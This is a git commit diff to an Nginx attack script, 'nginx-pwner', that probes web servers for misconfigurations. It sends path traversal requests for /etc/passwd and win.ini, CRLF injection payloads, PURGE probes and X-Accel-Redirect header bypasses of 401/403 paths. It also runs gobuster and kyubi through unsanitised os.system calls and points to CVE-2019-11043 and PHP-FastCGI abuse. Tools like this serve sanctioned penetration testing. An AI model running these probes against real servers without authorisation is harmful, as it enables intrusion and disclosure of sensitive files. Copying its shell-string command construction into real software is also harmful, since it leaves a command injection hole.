4b56c64b826153ebf6a57f126fc907922c6f092c
stark0de <53110298+stark0de@users.noreply.github.com>
2021-04-11 11:52:50 +0200

    Update nginx-pwner-no-server-header.py

--- nginx-pwner-no-server-header.py
+++ nginx-pwner-no-server-header.py
@@ -28,23 +28,25 @@ if sys.argv[1].endswith("/"):
     sys.exit()
 
 url = sys.argv[1]
-existingfolderpathlist = sys.argv[2]
+existingfolderpathlist = sys.argv[2] 
 
-print(Fore.YELLOW+"[!] IF your enumeration returned any 401 or 403 page, please try making a request to whatever route and add the header X-Accel-Redirect: /pathwith401or403")
+
 basereq = requests.get(url)
-print(Fore.WHITE+ "\n\n")
+
+print(Fore.BLUE+"[?] If the tool reveals the nginx.conf file this is probably because there is no root directive in the nginx.conf file. Get the contents of the file and use https://github.com/yandex/gixy to find more misconfigurations")
+print(Fore.WHITE+"\n\n")
 os.system("gobuster dir --url "+url+" -w ./nginx.txt --wildcard --random-agent")
 print("\n")
 uri_crlf_test= requests.get(url+"/%0d%0aDetectify:%20clrf")
 if "Detectify" in uri_crlf_test.headers:
-    print(Fore.RED+"[-] CRLF injection found via $uri or $document_uri parameter with payload: %0d%0aDetectify:%20crlf as URI")
+    print(Fore.RED+"[-] CRLF injection found via $uri or $document_uri parameter with payload: %0d%0aDetectify:%20crlf as URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
 else:
     print(Fore.GREEN+"[+] No CRLF via common misconfiguration found")
 #p = subprocess.Popen('curl -IL -X PURGE -D - "'+url+'"/* | grep HTTP', shell=True, stdout=subprocess.PIPE)
 #output, _ = p.communicate()
 purgemethod=requests.request("PURGE", url+"/", allow_redirects=True)
 #print(purgemethod.text+str(purgemethod.headers)+str(purgemethod.status_code))
-if purgemethod.status_code == "204":
+if purgemethod.status_code == 204:
     print(Fore.RED+"[-] Possibly misconfigured PURGE HTTP method (purges the web cache), test this HTTP method manually")
 else:
     print(Fore.GREEN+"[+] No signs of misconfigured PURGE HTTP method")
@@ -62,13 +64,13 @@ merge_slashes_etc_passwd_old = requests.get(url+ "///../../../../../etc/passwd")
 merge_slashes_etc_passwd = requests.get(url+ "//////../../../../../../etc/passwd")
 merge_slashes_winini_old = requests.get(url+ "///../../../../../win.ini")
 merge_slashes_winini = requests.get(url+ "//////../../../../../../win.ini")
-
+ 
 if basereq.status_code == merge_slashes_req and basereq.text == merge_slashes_req.text:
     print(Fore.RED+"[-] Merge slashes set to off. This is useful in case we find an LFI")
-if merge_slashes_etc_passwd.status_code == "200" or merge_slashes_etc_passwd_old.status_code =="200":
+if merge_slashes_etc_passwd.status_code == 200 or merge_slashes_etc_passwd_old.status_code ==200:
     print(Fore.RED+"[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
     print(Fore.RED+"[-] Try this to URIs manually: ///../../../../../etc/passwd and //////../../../../../../etc/passwd")
-elif merge_slashes_winini.status_code == "200" or merge_slashes_winini_old.status_code =="200":
+elif merge_slashes_winini.status_code == 200 or merge_slashes_winini_old.status_code ==200:
     print(Fore.RED+"[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
     print(Fore.RED+"[-] Try this to URIs manually: ///../../../../../win.ini and //////../../../../../../win.ini")
 else:
@@ -150,7 +152,7 @@ for x, y in tenzerozerodict.items():
        counter+=1
 if counter == 0:
    print("No relevant results for 10.0.0.1 tests")
-  
+
 print("\n"+Fore.BLUE+"[?] To test Raw backend reading responses, please make a request with the following contents to Nginx. In case the response is interesting: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#raw-backend-response-reading")
 a='''
 GET /? XTTP/1.1
@@ -158,6 +160,19 @@ Host: 127.0.0.1
 Connection: close
 '''
 print(Fore.WHITE+a)
+
+phpindexreq = requests.get(url+"/index.php", allow_redirects=True)
+if phpindexreq.status_code == 200:
+     print(Fore.GREEN+"[+] The site uses PHP")
+elif "PHPSESSID" in basereq.cookies:
+     print(Fore.GREEN+"[+] The site is using PHP")
+elif 'Server' in basereq.headers:
+    if "php" in basereq.headers["Server"]:
+        print(Fore.GREEN+ "[+] The site is using PHP")
+elif "X-Powered-By" in basereq.headers:
+    if "php" in basereq.headers["X-Powered-By"]:
+        print(Fore.GREEN+ "[+] The site is using PHP")
+
 print(Fore.YELLOW+"[!] If the site uses PHP check for this misconfig: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#script_name and also check this: https://github.com/jas502n/CVE-2019-11043. A last advice, if you happen to have a restricted file upload and you can reach the file you uploaded try making a request to <filename>/whatever.php,and if it executes PHP code it is because the PHP-FastCGI directive is badly configured (this normally only works for older PHP versions)")
 print("\n")
 print(Fore.BLUE+"[?] Executing Kyubi to check for path traversal vulnerabilities via misconfigured NGINX alias directive"+Fore.WHITE)
@@ -165,4 +180,33 @@ pathlist = open(existingfolderpathlist, "r")
 pathlines = pathlist.readlines()
 for pathline in pathlines:
     os.system("kyubi "+url+"/"+pathline.strip())
+pathlist.close()
+
+pathlist2 = open(existingfolderpathlist, "r")
+pathlines = pathlist2.readlines()
+counterunauthorised=0
+for pathline in pathlines:
+    makereq = requests.get(url+"/"+pathline.strip())
+    if makereq.status_code == 401 or makereq.status_code == 403:
+        counterunauthorised +=1
+        accel = {"X-Accel-Redirect" : "/"+pathline.strip()}
+        accelreq = requests.get(url+"/randompath",headers=accel)
+        if accelreq.status_code != makereq.status_code:
+            print(Fore.RED+"[-] Different status code when accessing "+pathline.strip()+" using a randompath in the URI, but the this path in the X-Accel-Redirect header")
+        else:
+            print(Fore.GREEN+"[+] No difference found with X-Accel-Redirect when trying to access "+pathline)
+if counterunauthorised == 0:
+    print(Fore.GREEN+"\n[+] No X-Accel-Redirect bypasses found using it as request header")
+pathlist2.close()
+
+pathlist3 = open(existingfolderpathlist, "r")
+pathlines = pathlist3.readlines()
+print(Fore.CYAN+"\n[?] Testing all provided paths to check to CRLF injection. This is specially interesting if the site uses S3 buckets or GCP to host files")
+for pathline in pathlines:
+    uri_crlf_test= requests.get(url+"/"+pathline.strip()+"%0d%0aDetectify:%20clrf")
+if "Detectify" in uri_crlf_test.headers:
+    print(Fore.RED+"[-] CRLF injection found via in URL:"+url+"/"+pathline.strip()+" payload: %0d%0aDetectify:%20crlf in URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
+
+print(Fore.CYAN+"\n[?] If the site uses Redis, please do check out: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/")
+
 print("\n\n"+Fore.CYAN+ "[*] More things that you need to test by hand: CORS misconfiguration (ex: bad regex) with tools like Corsy, Host Header injection, Web cache poisoning & Deception in case NGINX is being for caching as well, HTTP request smuggling both normal request smuggling and https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf. As well as the rest of typical web vulnerabilities")
